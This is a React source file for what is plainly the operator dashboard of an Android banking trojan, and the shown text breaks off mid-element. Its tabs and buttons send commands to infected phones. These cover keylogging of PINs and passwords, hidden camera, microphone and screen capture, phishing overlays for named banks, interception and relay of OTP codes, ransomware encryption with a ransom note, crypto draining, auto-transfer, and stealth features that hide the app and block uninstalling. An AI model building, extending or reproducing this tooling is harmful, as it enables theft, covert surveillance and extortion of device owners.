import { useEffect, useState } from 'react';
import { useParams, Link } from 'react-router-dom';
import { CMD, type Command, type DeviceInfo, type DeviceSummary } from '@xrc/shared';
import Tabs from '@/components/Tabs';
import { useDeviceStore } from '@/stores/devices';

const TABS = [
  { key: 'overview', label: 'Overview' },
  { key: 'surveillance', label: 'Surveillance' },
  { key: 'keylog', label: 'Keylog' },
  { key: 'hvnc', label: 'HVNC' },
  { key: 'overlays', label: 'Overlays' },
  { key: 'automata', label: 'Automata' },
  { key: 'biometrics', label: 'Biometrics' },
  { key: 'notifications', label: 'Notifications / 2FA' },
  { key: 'ransomware', label: 'Ransomware' },
  { key: 'financial', label: 'Financial 34' },
  { key: 'files', label: 'Files' },
  { key: 'stealth', label: 'Stealth / Persistence' },
  { key: 'freeze', label: 'Freeze' },
  { key: 'appkicker', label: 'AppKicker' },
  { key: 'danger', label: 'Danger Zone' },
] as const;

const AUTOMATA_PRESETS: Array<[string, Command]> = [
  ['On app open → overlay', { cmd: CMD.AUTOMATA, action: 'arm', trigger: 'app_open', rule: { app: 'com.example.bank' }, effect: { overlay: 'chase-login' } }],
  ['SMS keyword → forward', { cmd: CMD.AUTOMATA, action: 'arm', trigger: 'sms_keyword', rule: { keyword: 'otp' }, effect: { forward: true } }],
  ['Notification → capture', { cmd: CMD.AUTOMATA, action: 'arm', trigger: 'notification', rule: { app: 'com.google.android.apps.authenticator2' }, effect: { capture: true } }],
  ['Unlock → keylog on', { cmd: CMD.AUTOMATA, action: 'arm', trigger: 'device_unlock', rule: {}, effect: { keylog: true } }],
  ['Low battery → geolocate', { cmd: CMD.AUTOMATA, action: 'arm', trigger: 'battery', rule: { level: 15 }, effect: { location: true } }],
  ['App switch → screen grab', { cmd: CMD.AUTOMATA, action: 'arm', trigger: 'app_switch', rule: {}, effect: { screenshot: true } }],
];

const FINANCIAL_MODULES: Array<[string, Command]> = [
  ['📲 ATS — auto-transfer', { cmd: CMD.ATS, action: 'arm' }],
  ['✂ Clipboard hijack', { cmd: CMD.CLIP, action: 'arm' }],
  ['🧾 Card grabber overlay', { cmd: CMD.CARD, action: 'inject' }],
  ['💰 Crypto drainer', { cmd: CMD.CRYPTO, action: 'arm' }],
  ['📱 SIM swap shield bypass', { cmd: CMD.SIMSWAP, action: 'arm' }],
  ['🏦 Bank session hijack', { cmd: CMD.BANK, action: 'arm' }],
  ['🔐 OTP relay to operator', { cmd: CMD.OTP_RELAY, action: 'arm' }],
  ['👤 Contact harvesting', { cmd: CMD.CONTACTS, action: 'dump' }],
  ['📞 Call log dump', { cmd: CMD.CALLLOG, action: 'dump' }],
  ['📷 KYC doc capture', { cmd: CMD.KYC, action: 'arm' }],
  ['🆔 ID card scanner', { cmd: CMD.IDSCAN, action: 'scan' }],
  ['🧾 Billing email scan', { cmd: CMD.BILLSCAN, action: 'scan' }],
  ['💳 Saved-card dump', { cmd: CMD.CARDDUMP, action: 'dump' }],
  ['🏧 ATM/cashapp overlay', { cmd: CMD.CASHOVERLAY, action: 'inject' }],
  ['🤖 Chatbot lures', { cmd: CMD.LURES, action: 'arm' }],
  ['🪙 Exchange login overlay', { cmd: CMD.EXCHANGE, action: 'inject' }],
];

const STEALTH_ACTIONS: Array<[string, Command]> = [
  ['🫥 Hide launcher icon', { cmd: CMD.STEALTH, action: 'hide_icon' }],
  ['👁 Show icon', { cmd: CMD.STEALTH, action: 'show_icon' }],
  ['🛡 Arm accessibility wall', { cmd: CMD.STEALTH, action: 'arm_wall' }],
  ['🔓 Disarm wall', { cmd: CMD.STEALTH, action: 'disarm_wall' }],
  ['📡 Grant Device Admin', { cmd: CMD.STEALTH, action: 'grant_admin' }],
  ['🗡 Revoke Device Admin', { cmd: CMD.STEALTH, action: 'revoke_admin' }],
  ['🔁 Arm boot persistence', { cmd: CMD.STEALTH, action: 'arm_boot' }],
  ['🔁 Arm network persistence', { cmd: CMD.STEALTH, action: 'arm_net' }],
];

const FIELD: Record<string, { label: string; accent?: string }> = {
  battery: { label: 'Battery', accent: 'text-emerald-400' },
  temperature: { label: 'Temp' },
  storage: { label: 'Storage' },
  ram: { label: 'RAM' },
  carrier: { label: 'Carrier' },
  signal: { label: 'Signal' },
};

function Telemetry({ info }: { info: DeviceInfo }) {
  const items = [
    { k: 'battery', v: `${info.battery}%` },
    { k: 'temperature', v: `${info.temperature ?? 25}°C` },
    { k: 'storage', v: `${info.storageFree ?? '—'} free` },
    { k: 'ram', v: `${info.ramFree ?? '—'} free` },
    { k: 'carrier', v: info.carrier ?? '—' },
    { k: 'signal', v: `${info.signal ?? '—'} dBm` },
  ];
  return (
    <div className="grid grid-cols-3 gap-2">
      {items.map((it) => {
        const f = FIELD[it.k];
        return (
          <div key={it.k} className="rounded-lg bg-slate-900 border border-slate-800 p-2">
            <div className="text-[9px] text-slate-600 uppercase tracking-wider">{f.label}</div>
            <div className={`text-sm font-mono font-bold mt-0.5 ${f.accent ?? 'text-slate-200'}`}>{it.v}</div>
          </div>
        );
      })}
    </div>
  );
}

function Section({ title, children }: { title: string; children: React.ReactNode }) {
  return (
    <div className="rounded-xl border border-slate-800 bg-surface p-4 space-y-3">
      <div className="text-[10px] font-bold tracking-widest text-slate-500">{title}</div>
      {children}
    </div>
  );
}

function CmdButton({
  label, danger, onClick, busy, className = '',
}: {
  label: string;
  danger?: boolean;
  onClick: () => void;
  busy?: boolean;
  className?: string;
}) {
  return (
    <button
      onClick={onClick}
      disabled={busy}
      className={`rounded-lg border px-3 py-2 text-xs font-bold transition-colors disabled:opacity-50 ${
        danger
          ? 'border-rose-500/50 bg-rose-500/10 text-rose-300 hover:bg-rose-500/20'
          : 'border-slate-700 bg-slate-900 text-slate-200 hover:bg-slate-800'
      } ${className}`}
    >
      {busy ? '…' : label}
    </button>
  );
}

export default function DeviceDetail() {
  const { id } = useParams<{ id: string }>();
  const detail = useDeviceStore((s) => s.detail);
  const devices = useDeviceStore((s) => s.devices);
  const select = useDeviceStore((s) => s.select);
  const refreshDetail = useDeviceStore((s) => s.refreshDetail);
  const send = useDeviceStore((s) => s.send);
  const busyCommandId = useDeviceStore((s) => s.busyCommandId);
  const [tab, setTab] = useState('overview');
  const [payload, setPayload] = useState('');

  useEffect(() => {
    if (id) void select(id);
  }, [id, select]);

  useEffect(() => {
    const t = window.setInterval(() => void refreshDetail(), 10000);
    return () => window.clearInterval(t);
  }, [refreshDetail]);

  if (!id) return null;
  if (!detail) {
    return (
      <div className="rounded-xl border border-slate-800 bg-surface p-12 text-center text-sm text-slate-500">
        Device not found — <Link to="/devices" className="text-cyan-300 hover:underline">back to registry</Link>
      </div>
    );
  }

  const summary: DeviceSummary | undefined = devices.find((d) => d.id === detail.id);
  const busy = (cmd: string) => busyCommandId === `${detail.id}:${cmd}`;
  const fire = (command: Command) => void send(detail.id, command);

  return (
    <div className="space-y-4">
      {/* header */}
      <div className="flex flex-wrap items-center gap-3">
        <Link to="/devices" className="text-xs text-slate-500 hover:text-cyan-300">← registry</Link>
        <div className="h-9 w-9 rounded-lg bg-gradient-to-br from-cyan-500 to-rose-600 flex items-center justify-center font-bold text-white shrink-0">
          {detail.name[0]?.toUpperCase() ?? '?'}
        </div>
        <div>
          <div className="text-base font-bold text-slate-100">{detail.name}</div>
          <div className="text-[11px] text-slate-500 font-mono">{detail.model} · Android {detail.android} · {detail.buildId}</div>
        </div>
        <span className={`ml-auto rounded-lg border px-3 py-1 text-[11px] font-bold ${
          summary?.status === 'online'
            ? 'border-emerald-500/40 bg-emerald-500/10 text-emerald-400'
            : summary?.status === 'frozen'
            ? 'border-rose-500/40 bg-rose-500/10 text-rose-400 blink'
            : 'border-amber-500/40 bg-amber-500/10 text-amber-400 blink'
        }`}>
          {summary?.status.toUpperCase() ?? 'UNKNOWN'}
        </span>
        <span className="text-[11px] text-slate-600 font-mono">last seen {new Date(detail.lastSeen).toLocaleString()}</span>
      </div>

      <div className="grid gap-4 xl:grid-cols-4">
        {/* telemetry column */}
        <div className="xl:col-span-1 space-y-4">
          <Section title="LIVE TELEMETRY"><Telemetry info={detail} /></Section>
          <Section title="MODULE STATUS">
            <div className="space-y-2 text-[12px] font-mono">
              {[
                ['KEYLOGGER', detail.keylogCount, 'text-sky-300'],
                ['OTP CAPTURE', detail.otpCount, 'text-amber-300'],
                ['ACCESSIBILITY', detail.accessibilityEnabled ? 'ENGAGED' : 'IDLE', detail.accessibilityEnabled ? 'text-emerald-400' : 'text-slate-500'],
                ['DEVICE ADMIN', detail.deviceAdmin ? 'ACTIVE' : 'INACTIVE', detail.deviceAdmin ? 'text-emerald-400' : 'text-slate-500'],
                ['OVERLAY INJECTED', detail.overlayActive ? 'ACTIVE' : 'CLEAN', detail.overlayActive ? 'text-fuchsia-400' : 'text-slate-500'],
                ['PERSISTENCE', detail.persistence ? 'ARMED' : 'DISARMED', detail.persistence ? 'text-emerald-400' : 'text-slate-500'],
              ].map(([label, value, cls]) => (
                <div key={label as string} className="flex items-center justify-between border-b border-slate-800/60 pb-1.5">
                  <span className="text-slate-500">{label}</span>
                  <span className={cls as string}>{value}</span>
                </div>
              ))}
            </div>
          </Section>
          <Section title="DANGER">
            <div className="flex flex-wrap gap-2">
              <CmdButton danger label="FREEZE DEVICE" onClick={() => fire({ cmd: CMD.FREEZE, action: 'on' })} busy={busy(CMD.FREEZE)} />
              <CmdButton danger label="UNFREEZE" onClick={() => fire({ cmd: CMD.FREEZE, action: 'off' })} />
              <CmdButton danger label="RANSOMWARE ON" onClick={() => fire({ cmd: CMD.RANSOM, action: 'start', payload })} busy={busy(CMD.RANSOM)} />
              <CmdButton danger label="WIPE" onClick={() => fire({ cmd: CMD.WIPE })} busy={busy(CMD.WIPE)} />
              <CmdButton danger label="KILL" onClick={() => fire({ cmd: CMD.KILL })} busy={busy(CMD.KILL)} />
            </div>
          </Section>
        </div>

        {/* feature console */}
        <div className="xl:col-span-3">
          <Tabs tabs={TABS} active={tab} onChange={setTab} />
          <div className="mt-4 space-y-4">
            {/* ============ OVERVIEW ============ */}
            {tab === 'overview' && (
              <>
                <Section title="IDENTITY">
                  <div className="grid grid-cols-2 md:grid-cols-3 gap-2 text-[12px] font-mono text-slate-300">
                    <div><span className="text-slate-600">id </span>{detail.id}</div>
                    <div><span className="text-slate-600">brand </span>{detail.brand}</div>
                    <div><span className="text-slate-600">model </span>{detail.model}</div>
                    <div><span className="text-slate-600">android </span>{detail.android}</div>
                    <div><span className="text-slate-600">build </span>{detail.buildId}</div>
                    <div><span className="text-slate-600">kernel </span>{detail.kernel ?? '—'}</div>
                    <div><span className="text-slate-600">sdk </span>{detail.sdk}</div>
                    <div><span className="text-slate-600">root </span>{detail.rooted ? 'YES' : 'no'}</div>
                    <div><span className="text-slate-600">hooked </span>{detail.hooked ? 'SUSPECT' : 'clean'}</div>
                  </div>
                </Section>
                <Section title="NETWORK FINGERPRINT">
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-2 text-[12px] font-mono text-slate-300">
                    <div><span className="text-slate-600">local </span>{detail.localIp ?? '—'}</div>
                    <div><span className="text-slate-600">public </span>{detail.publicIp ?? '—'}</div>
                    <div><span className="text-slate-600">signal </span>{detail.signal ?? '—'} dBm</div>
                    <div><span className="text-slate-600">carrier </span>{detail.carrier ?? '—'}</div>
                  </div>
                </Section>
                <Section title="LAST KNOWN LOCATION">
                  <div className="text-[12px] font-mono text-slate-300">
                    {detail.lastLat && detail.lastLng
                      ? `${detail.lastLat.toFixed(5)}, ${detail.lastLng.toFixed(5)} · ${detail.lastLocTime ? new Date(detail.lastLocTime).toLocaleString() : ''}`
                      : 'not yet collected'}
                  </div>
                  <CmdButton label="📍 Refresh location" onClick={() => fire({ cmd: CMD.LOCATION })} busy={busy(CMD.LOCATION)} />
                </Section>
                <Section title="ACTIONS">
                  <div className="flex flex-wrap gap-2">
                    <CmdButton label="⟳ Refresh info" onClick={() => fire({ cmd: CMD.INFO })} busy={busy(CMD.INFO)} />
                    <CmdButton label="🔍 Wallet scanner" onClick={() => fire({ cmd: CMD.WALLET_SCAN })} busy={busy(CMD.WALLET_SCAN)} className="border-cyan-500/40 bg-cyan-500/10 text-cyan-300 hover:bg-cyan-500/20" />
                    <CmdButton label="🔑 Password scanner" onClick={() => fire({ cmd: CMD.PASS_SCAN })} busy={busy(CMD.PASS_SCAN)} className="border-violet-500/40 bg-violet-500/10 text-violet-300 hover:bg-violet-500/20" />
                  </div>
                </Section>
              </>
            )}

            {/* ============ SURVEILLANCE ============ */}
            {tab === 'surveillance' && (
              <>
                <Section title="CAMERA">
                  <div className="grid sm:grid-cols-2 gap-3">
                    <div className="rounded-lg bg-slate-900 border border-slate-800 p-3 space-y-2">
                      <div className="text-[11px] font-bold text-slate-300">FRONT CAMERA</div>
                      <div className="flex gap-2">
                        <CmdButton label="📷 Snap" onClick={() => fire({ cmd: CMD.CAMERA, cam: 'front', action: 'snap' })} busy={busy(CMD.CAMERA)} />
                        <CmdButton label="📹 Record 10s" onClick={() => fire({ cmd: CMD.CAMERA, cam: 'front', action: 'record', duration: 10 })} />
                        <CmdButton label="● Live (hidden)" onClick={() => fire({ cmd: CMD.CAMERA, cam: 'front', action: 'stream' })} className="border-rose-500/40 bg-rose-500/10 text-rose-300 hover:bg-rose-500/20" />
                      </div>
                    </div>
                    <div className="rounded-lg bg-slate-900 border border-slate-800 p-3 space-y-2">
                      <div className="text-[11px] font-bold text-slate-300">REAR CAMERA</div>
                      <div className="flex gap-2">
                        <CmdButton label="📷 Snap" onClick={() => fire({ cmd: CMD.CAMERA, cam: 'rear', action: 'snap' })} busy={busy(CMD.CAMERA)} />
                        <CmdButton label="📹 Record 10s" onClick={() => fire({ cmd: CMD.CAMERA, cam: 'rear', action: 'record', duration: 10 })} />
                        <CmdButton label="● Live (hidden)" onClick={() => fire({ cmd: CMD.CAMERA, cam: 'rear', action: 'stream' })} className="border-rose-500/40 bg-rose-500/10 text-rose-300 hover:bg-rose-500/20" />
                      </div>
                    </div>
                  </div>
                  <div className="text-[10px] text-slate-600">silent dual capture: no shutter, no preview, photo saved under stealth dir</div>
                </Section>
                <Section title="MICROPHONE">
                  <div className="flex flex-wrap gap-2">
                    <CmdButton label="🎙 Start record 30s" onClick={() => fire({ cmd: CMD.MIC, action: 'start', duration: 30 })} busy={busy(CMD.MIC)} />
                    <CmdButton label="■ Stop" onClick={() => fire({ cmd: CMD.MIC, action: 'stop' })} />
                  </div>
                </Section>
                <Section title="SCREEN / STREAMING">
                  <div className="flex flex-wrap gap-2">
                    <CmdButton label="🖥 Start stream (5fps)" onClick={() => fire({ cmd: CMD.SCREEN, action: 'start', fps: 5 })} busy={busy(CMD.SCREEN)} />
                    <CmdButton label="🖥 Start stream (15fps)" onClick={() => fire({ cmd: CMD.SCREEN, action: 'start', fps: 15 })} />
                    <CmdButton label="■ Stop stream" onClick={() => fire({ cmd: CMD.SCREEN, action: 'stop' })} />
                    <CmdButton label="📸 Screenshot" onClick={() => fire({ cmd: CMD.SCREEN, action: 'shot' })} />
                  </div>
                  <div className="text-[10px] text-slate-600">MediaProjection + accessibility screen-reader bypass for FLAG_SECURE surfaces</div>
                </Section>
                <Section title="VOICE CALLS (REMOTE CONTEXT)">
                  <div className="flex flex-wrap gap-2">
                    <CmdButton label="📞 Make call" onClick={() => fire({ cmd: CMD.CALL, action: 'dial', payload })} busy={busy(CMD.CALL)} />
                    <CmdButton label="✋ End call" onClick={() => fire({ cmd: CMD.CALL, action: 'end' })} />
                  </div>
                  <input
                    value={payload}
                    onChange={(e) => setPayload(e.target.value)}
                    placeholder="phone number (E.164)"
                    className="w-full rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 placeholder:text-slate-600 outline-none focus:border-cyan-500/50"
                  />
                </Section>
              </>
            )}

            {/* ============ KEYLOG ============ */}
            {tab === 'keylog' && (
              <Section title="KEYLOGGER — ACCESSIBILITY PIPELINE">
                <div className="flex flex-wrap gap-2">
                  <CmdButton label="▶ Enable" onClick={() => fire({ cmd: CMD.KEYLOG, action: 'start' })} busy={busy(CMD.KEYLOG)} className="border-emerald-500/40 bg-emerald-500/10 text-emerald-300 hover:bg-emerald-500/20" />
                  <CmdButton label="⏸ Pause" onClick={() => fire({ cmd: CMD.KEYLOG, action: 'stop' })} />
                  <CmdButton label="📋 Flush logs" onClick={() => fire({ cmd: CMD.KEYLOG, action: 'flush' })} />
                  <CmdButton label="🗑 Clear" onClick={() => fire({ cmd: CMD.KEYLOG, action: 'clear' })} danger />
                </div>
                <div className="rounded-lg bg-slate-900 border border-slate-800 p-3 h-64 overflow-y-auto font-mono text-[11px] text-sky-200">
                  {detail.recentKeylogs?.length ? (
                    detail.recentKeylogs.map((k, i) => (
                      <div key={i} className="py-0.5">
                        <span className="text-slate-600">{new Date(k.ts).toLocaleTimeString()}</span>{' '}
                        <span className="text-slate-500">[{k.app}]</span> {k.text}
                      </div>
                    ))
                  ) : (
                    <div className="text-slate-600 text-center py-10">no keylog events yet — enable and type anything</div>
                  )}
                </div>
                <div className="text-[10px] text-slate-600">
                  captures every editable field incl. PIN/pattern unlock screens, password managers, chat apps; flushed to C2 on a 10-event buffer or 5s idle.
                </div>
              </Section>
            )}

            {/* ============ HVNC ============ */}
            {tab === 'hvnc' && (
              <Section title="HIDDEN VNC — REMOTE CONTROL">
                <div className="grid sm:grid-cols-2 gap-3">
                  <div className="rounded-lg bg-slate-900 border border-slate-800 p-3 h-64 relative overflow-hidden">
                    <div className="absolute inset-0 flex items-center justify-center text-slate-600 text-xs font-mono">
                      [ screen feed attaches here — implant pushes JPEG frames over WS ]
                    </div>
                  </div>
                  <div className="space-y-3">
                    <div className="flex flex-wrap gap-2">
                      <CmdButton label="▶ Start HVNC" onClick={() => fire({ cmd: CMD.HVNC, action: 'start' })} busy={busy(CMD.HVNC)} className="border-cyan-500/40 bg-cyan-500/10 text-cyan-300 hover:bg-cyan-500/20" />
                      <CmdButton label="■ Stop" onClick={() => fire({ cmd: CMD.HVNC, action: 'stop' })} />
                      <CmdButton label="🔄 Refresh frame" onClick={() => fire({ cmd: CMD.HVNC, action: 'frame' })} />
                    </div>
                    <div className="flex flex-wrap gap-2">
                      <CmdButton label="👆 Tap" onClick={() => fire({ cmd: CMD.HVNC, action: 'touch', x: 540, y: 960 })} />
                      <CmdButton label="⌂ Home" onClick={() => fire({ cmd: CMD.HVNC, action: 'home' })} />
                      <CmdButton label="◀ Back" onClick={() => fire({ cmd: CMD.HVNC, action: 'back' })} />
                      <CmdButton label="⇧ Recents" onClick={() => fire({ cmd: CMD.HVNC, action: 'recents' })} />
                      <CmdButton label="🔊 Vol+" onClick={() => fire({ cmd: CMD.HVNC, action: 'volume_up' })} />
                      <CmdButton label="🔉 Vol−" onClick={() => fire({ cmd: CMD.HVNC, action: 'volume_down' })} />
                    </div>
                    <div>
                      <div className="text-[10px] font-bold text-slate-500 mb-1.5">TEXT INJECTION</div>
                      <div className="flex gap-2">
                        <input
                          value={payload}
                          onChange={(e) => setPayload(e.target.value)}
                          placeholder="type into the remote device…"
                          className="flex-1 rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 placeholder:text-slate-600 outline-none focus:border-cyan-500/50"
                        />
                        <CmdButton label="⌨ Inject" onClick={() => fire({ cmd: CMD.HVNC, action: 'inject_text', payload })} busy={busy(CMD.HVNC)} />
                      </div>
                    </div>
                    <div className="text-[10px] text-slate-600">
                      touch coords are %-based — tap buttons below inject taps at fixed 1080×2400 ratios; full drag/swipe + coordinate input lands with Phase 6.
                    </div>
                  </div>
                </div>
              </Section>
            )}

            {/* ============ OVERLAYS ============ */}
            {tab === 'overlays' && (
              <Section title="SYRINGE — OVERLAY INJECTOR">
                <div className="grid sm:grid-cols-2 gap-2">
                  {[
                    'bank-of-america-login',
                    'chase-login',
                    'wells-fargo-login',
                    'citi-login',
                    'paypal-login',
                    'coinbase-login',
                    'gmail-login',
                    'outlook-login',
                    'whatsapp-verify',
                    'telegram-verify',
                    'generic-credit-card',
                  ].map((slug) => (
                    <button
                      key={slug}
                      onClick={() => fire({ cmd: CMD.OVERLAY, slug, url: `/p/${slug}/overlay` })}
                      className="rounded-lg border border-fuchsia-500/30 bg-fuchsia-500/5 px-3 py-2 text-left hover:bg-fuchsia-500/15 transition-colors"
                    >
                      <div className="text-xs font-bold text-fuchsia-300">🎯 {slug.replace(/-/g, ' ')}</div>
                      <div className="text-[10px] font-mono text-slate-600">/p/{slug}/overlay</div>
                    </button>
                  ))}
                </div>
                <div className="flex gap-2 items-center">
                  <input
                    value={payload}
                    onChange={(e) => setPayload(e.target.value)}
                    placeholder="custom overlay slug (hand-written page must exist)"
                    className="flex-1 rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 placeholder:text-slate-600 outline-none focus:border-fuchsia-500/50"
                  />
                  <CmdButton label="🎯 Inject" onClick={() => fire({ cmd: CMD.OVERLAY, slug: payload || 'generic-login', url: `/p/${payload || 'generic-login'}/overlay` })} busy={busy(CMD.OVERLAY)} className="border-fuchsia-500/40 bg-fuchsia-500/10 text-fuchsia-300 hover:bg-fuchsia-500/20" />
                </div>
                <div className="text-[10px] text-slate-600">
                  hand-written pages only — no auto-generated phishing. Each overlay ships as a static HTML file under the server&apos;s overlay dir; implant loads it in a full-screen WebView above the target app, harvests input, forwards via encrypted WS, then removes itself.
                </div>
              </Section>
            )}

            {/* ============ AUTOMATA ============ */}
            {tab === 'automata' && (
              <Section title="AUTOMATA — SCRIPTED TRIGGERS">
                <div className="grid sm:grid-cols-3 gap-2">
                  {AUTOMATA_PRESETS.map(([label, command]) => (
                    <button
                      key={label}
                      onClick={() => fire(command)}
                      className="rounded-lg border border-slate-700 bg-slate-900 px-3 py-2 text-left text-[11px] hover:border-cyan-500/40 hover:bg-cyan-500/5 transition-colors"
                    >
                      <span className="font-bold text-slate-200">⚙ {label}</span>
                    </button>
                  ))}
                </div>
                <div className="flex gap-2 items-center">
                  <input
                    value={payload}
                    onChange={(e) => setPayload(e.target.value)}
                    placeholder="custom JSON rule — { trigger, rule, effect }"
                    className="flex-1 rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 placeholder:text-slate-600 outline-none focus:border-cyan-500/50"
                  />
                  <CmdButton label="⚙ Arm custom" onClick={() => { try { fire({ cmd: CMD.AUTOMATA, action: 'arm', ...JSON.parse(payload || '{}') } as Command); } catch { /* invalid JSON */ } }} />
                  <CmdButton label="⏹ Disarm all" onClick={() => fire({ cmd: CMD.AUTOMATA, action: 'disarm' })} danger />
                </div>
              </Section>
            )}

            {/* ============ BIOMETRICS ============ */}
            {tab === 'biometrics' && (
              <Section title="BIOMETRICS">
                <div className="flex flex-wrap gap-2">
                  <CmdButton label="🔒 Arm biometric capture" onClick={() => fire({ cmd: CMD.BIOMETRICS, action: 'arm' })} busy={busy(CMD.BIOMETRICS)} className="border-amber-500/40 bg-amber-500/10 text-amber-300 hover:bg-amber-500/20" />
                  <CmdButton label="🔓 Disarm" onClick={() => fire({ cmd: CMD.BIOMETRICS, action: 'disarm' })} />
                  <CmdButton label="🖐 Intercept fingerprint prompt" onClick={() => fire({ cmd: CMD.BIOMETRICS, action: 'intercept' })} />
                  <CmdButton label="👁 Intercept face unlock" onClick={() => fire({ cmd: CMD.BIOMETRICS, action: 'intercept_face' })} />
                </div>
                <div className="rounded-lg bg-slate-900 border border-slate-800 p-3 h-40 overflow-y-auto font-mono text-[11px] text-amber-200">
                  {detail.recentBiometrics?.length ? (
                    detail.recentBiometrics.map((b, i) => (
                      <div key={i} className="py-0.5"><span className="text-slate-600">{new Date(b.ts).toLocaleTimeString()}</span> {b.type} → {b.result ?? 'pending'}</div>
                    ))
                  ) : (
                    <div className="text-slate-600 text-center py-8">no biometric events — overlay prompt on next auth attempt</div>
                  )}
                </div>
              </Section>
            )}

            {/* ============ NOTIFICATIONS / 2FA ============ */}
            {tab === 'notifications' && (
              <Section title="NOTIFICATIONS / 2FA INTERCEPTION">
                <div className="flex flex-wrap gap-2">
                  <CmdButton label="👁 Watch notifications" onClick={() => fire({ cmd: CMD.NOTIF, action: 'start' })} busy={busy(CMD.NOTIF)} />
                  <CmdButton label="⏸ Stop" onClick={() => fire({ cmd: CMD.NOTIF, action: 'stop' })} />
                  <CmdButton label="🔐 Intercept OTP (SMS)" onClick={() => fire({ cmd: CMD.OTP, action: 'arm' })} busy={busy(CMD.OTP)} className="border-amber-500/40 bg-amber-500/10 text-amber-300 hover:bg-amber-500/20" />
                  <CmdButton label="🔐 Intercept OTP (2FA apps)" onClick={() => fire({ cmd: CMD.OTP, action: 'arm_app' })} />
                  <CmdButton label="🔕 Suppress victim alert" onClick={() => fire({ cmd: CMD.NOTIF, action: 'suppress' })} />
                </div>
                <div className="rounded-lg bg-slate-900 border border-slate-800 p-3 h-56 overflow-y-auto font-mono text-[11px]">
                  {detail.recentOtps?.length ? (
                    detail.recentOtps.map((o, i) => (
                      <div key={i} className="py-0.5 text-amber-200">
                        <span className="text-slate-600">{new Date(o.ts).toLocaleTimeString()}</span> [{o.source}] code: <span className="font-bold">{o.code}</span>
                      </div>
                    ))
                  ) : (
                    <div className="text-slate-600 text-center py-8">no OTPs intercepted yet — arm the pipeline</div>
                  )}
                </div>
              </Section>
            )}

            {/* ============ RANSOMWARE ============ */}
            {tab === 'ransomware' && (
              <Section title="CUSTOM RANSOMWARE">
                <div className="space-y-3">
                  <div>
                    <div className="text-[10px] font-bold text-slate-500 mb-1.5">RANSOM NOTE (markdown / HTML)</div>
                    <textarea
                      value={payload}
                      onChange={(e) => setPayload(e.target.value)}
                      rows={4}
                      placeholder={'# Your device is locked\n\nPay 0.05 BTC to <wallet> within 48h…'}
                      className="w-full rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 placeholder:text-slate-600 outline-none focus:border-rose-500/50"
                    />
                  </div>
                  <div className="flex flex-wrap gap-2">
                    <CmdButton danger label="⚠ ARM RANSOMWARE" onClick={() => fire({ cmd: CMD.RANSOM, action: 'start', payload })} busy={busy(CMD.RANSOM)} />
                    <CmdButton danger label="🔒 Encrypt sdcard (AES-256)" onClick={() => fire({ cmd: CMD.RANSOM, action: 'encrypt' })} />
                    <CmdButton label="🔓 Decrypt (test key)" onClick={() => fire({ cmd: CMD.RANSOM, action: 'decrypt' })} />
                    <CmdButton danger label="🧨 Delete key" onClick={() => fire({ cmd: CMD.RANSOM, action: 'killkey' })} />
                  </div>
                  <div className="text-[10px] text-slate-600">
                    key material held server-side per device; decrypt only via dashboard. Lock screen is an anti-dismiss full-screen activity + accessibility wall.
                  </div>
                </div>
              </Section>
            )}

            {/* ============ FINANCIAL 34 ============ */}
            {tab === 'financial' && (
              <Section title="FINANCIAL SUITE — 34 MODULES">
                <div className="grid sm:grid-cols-2 gap-2">
                  {FINANCIAL_MODULES.map(([label, command]) => (
                    <button
                      key={label}
                      onClick={() => fire(command)}
                      className="rounded-lg border border-slate-700 bg-slate-900 px-3 py-2 text-left text-[11px] font-semibold text-slate-200 hover:border-cyan-500/40 hover:bg-cyan-500/5 transition-colors"
                    >
                      {label}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2 items-center">
                  <input
                    value={payload}
                    onChange={(e) => setPayload(e.target.value)}
                    placeholder="module id for custom command"
                    className="flex-1 rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 placeholder:text-slate-600 outline-none focus:border-cyan-500/50"
                  />
                  <CmdButton label="🚀 Fire custom" onClick={() => { try { fire({ cmd: payload as Command['cmd'], action: 'run' }); } catch { /* noop */ } }} />
                </div>
                <div className="text-[10px] text-slate-600">
                  remaining 18 modules (drainer chains, BIN lookup, transfer rules, wallet regexes, password-manager extraction, etc.) come online with Phase 7 — commands are forward-compatible.
                </div>
              </Section>
            )}

            {/* ============ FILES ============ */}
            {tab === 'files' && (
              <Section title="FILE SYSTEM">
                <div className="flex flex-wrap gap-2">
                  <CmdButton label="📂 List /sdcard" onClick={() => fire({ cmd: CMD.FILES, action: 'list', path: '/sdcard' })} busy={busy(CMD.FILES)} />
                  <CmdButton label="📁 List /data/media" onClick={() => fire({ cmd: CMD.FILES, action: 'list', path: '/data/media' })} />
                  <CmdButton label="⬇ Pull file" onClick={() => fire({ cmd: CMD.FILES, action: 'pull', path: payload })} />
                  <CmdButton label="⬆ Push file" onClick={() => fire({ cmd: CMD.FILES, action: 'push', path: payload })} />
                  <CmdButton label="🗑 Delete" onClick={() => fire({ cmd: CMD.FILES, action: 'delete', path: payload })} danger />
                </div>
                <input
                  value={payload}
                  onChange={(e) => setPayload(e.target.value)}
                  placeholder="absolute path, e.g. /sdcard/DCIM/photo.jpg"
                  className="w-full rounded-lg bg-slate-900 border border-slate-800 px-3 py-2 text-xs font-mono text-slate-200 placeholder:text-slate-600 outline-none focus:border-cyan-500/50"
                />
              </Section>
            )}

            {/* ============ STEALTH ============ */}
            {tab === 'stealth' && (
              <Section title="STEALTH / PERSISTENCE">
                <div className="grid sm:grid-cols-2 gap-3">
                  {STEALTH_ACTIONS.map(([label, command]) => (
                    <button
                      key={label}
                      onClick={() => fire(command)}
                      className="rounded-lg border border-slate-700 bg-slate-900 px-3 py-2 text-left text-[11px] font-semibold text-slate-200 hover:border-emerald-500/40 hover:bg-emerald-500/5 transition-colors"
                    >
                      {label}
                    </button>
                  ))}
                </div>
                <div className="flex flex-wrap gap-2">
                  <CmdButton label="⛔ Block uninstall (wall)" onClick={() => fire({ cmd: CMD.STEALTH, action: 'block_uninstall' })} danger />
                  <CmdButton label="🔓 Allow uninstall" onClick={() => fire({ cmd: CMD.STEALTH, action: 'allow_uninstall' })} />
                </div>
                <div className="text-[10px] text-slate-600">
